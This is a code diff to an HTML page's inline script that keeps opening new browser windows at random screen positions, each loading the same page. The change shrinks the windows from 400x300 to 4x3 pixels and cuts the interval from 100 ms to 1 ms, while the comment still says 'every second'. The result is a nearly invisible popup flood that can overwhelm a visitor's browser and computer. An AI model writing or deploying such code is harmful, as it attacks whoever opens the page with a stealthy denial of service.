@@ -34,8 +34,8 @@
     <script>
         function openMovingWindows() {
             setInterval(() => {
-                const width = 400;
-                const height = 300;
+                const width = 4;
+                const height = 3;
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
 
@@ -44,7 +44,7 @@
                 const randomY = Math.floor(Math.random() * (screenHeight - height));
 
                 window.open(window.location.href, '_blank', `width=${width},height=${height},left=${randomX},top=${randomY}`);
-            }, 100); // Opens a new moving window every second
+            }, 1); // Opens a new moving window every second
         }
 
         // Ensure it only opens new windows when directly accessed
@@ -54,3 +54,4 @@
     </script>
 </body>
 </html>
+
